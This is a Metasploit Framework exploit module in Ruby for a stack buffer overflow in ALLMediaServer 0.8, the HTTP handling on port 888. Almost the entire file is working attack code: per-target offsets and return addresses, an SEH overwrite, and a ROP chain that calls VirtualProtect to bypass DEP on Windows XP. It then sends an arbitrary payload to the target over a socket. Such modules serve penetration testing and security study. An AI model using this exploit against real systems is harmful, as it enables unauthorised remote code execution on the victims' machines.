# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ALLMediaServer 0.8 Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack buffer overflow in ALLMediaServer 0.8. The vulnerability
        is caused due to a boundary error within the handling of HTTP request.

        While the exploit supports DEP bypass via ROP, on Windows 7 the stack pivoting isn&#039;t
        reliable across virtual (VMWare, VirtualBox) and physical  environments. Because of
        this the module isn&#039;t using DEP bypass on the Windows 7 SP1 target, where by default
        DEP is OptIn and AllMediaServer won&#039;t run with DEP.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;motaz reda <motazkhodair[at]gmail.com>&#039;,  # Original discovery
          &#039;modpr0be <tom[at]spentera.com>&#039;,  # Metasploit module
          &#039;juan vazquez&#039; # More improvement
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;19625&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;, #none/process/thread/seh
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "",
          &#039;Space&#039; => 660,
          &#039;DisableNops&#039; => true
        },

      &#039;Targets&#039;        =>
        [
          [ &#039;ALLMediaServer 0.8 / Windows XP SP3 - English&#039;,
            {
              &#039;Ret&#039;       =>  0x65ec74dc, # ADD ESP,6CC # POP # POP # POP # RET - avcoded-53.dll
              &#039;OffsetRop&#039; =>  696,
              &#039;jmp&#039;       =>  264,
              &#039;Offset&#039;    =>  1072
            }
          ],
          [ &#039;ALLMediaServer 0.8 / Windows 7 SP1 - English&#039;,
            {
              &#039;Ret&#039;       =>  0x6ac5cc92, # ppr from avformat-53.dll
              &#039;Offset&#039;    =>  1072
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Jul 04 2012&#039;,
      &#039;DefaultTarget&#039;  => 1))

    register_options([Opt::RPORT(888)], self.class)

  end

  def junk(n=1)
    return [rand_text_alpha(4).unpack("L")[0]] * n
  end

  def nops(rop=false, n=1)
    return rop ? [0x665a0aa1] * n : [0x90909090] * n
  end

  def asm(code)
    Metasm::Shellcode.assemble(Metasm::Ia32.new, code).encode_string
  end

  def exploit
    #with help from mona :)
    rop = [
      nops(true, 12),  #ROP NOP
      0x65f6faa7,      # POP EAX # RETN
      0x671ee4e0,      # ptr to &VirtualProtect()
      0x6ac1ccb4,      # MOV EAX,DWORD PTR DS:[EAX] # RETN
      0x667ceedf,      # PUSH EAX # POP ESI # POP EDI # RETN
      junk,
      0x65f5f09d,      # POP EBP # RETN
      0x65f9830d,      # & call esp
      0x6ac1c1d5,      # POP EBX # RETN
      0x00000600,      # 0x00000320-> ebx
      0x6672a1e2,      # POP EDX # RETN
      0x00000040,      # 0x00000040-> edx
      0x665a09df,      # POP ECX # RETN
      0x6ad58a3d,      # &Writable location
      0x6ac7a771,      # POP EDI # RETN
      nops(true),      # RETN (ROP NOP)
      0x6682f9f4,      # POP EAX # RETN
      nops,            # nop
      0x663dcbd2       # PUSHAD # RETN
    ].flatten.pack("V*")

    connect

    if target.name =~ /Windows 7/
      buffer = rand_text(target[&#039;Offset&#039;])
      buffer << generate_seh_record(target.ret)
      buffer << payload.encoded
    else
      buffer = rand_text(target[&#039;OffsetRop&#039;])  #junk
      buffer << rop
      buffer << asm("jmp $+0x#{target[&#039;jmp&#039;].to_s(16)}") # jmp to payload
      buffer << rand_text(target[&#039;Offset&#039;] - buffer.length)
      buffer << generate_seh_record(target.ret)
      buffer << payload.encoded
    end

    print_status("Sending payload to ALLMediaServer on #{target.name}...")
    sock.put(buffer)

    disconnect

  end
end



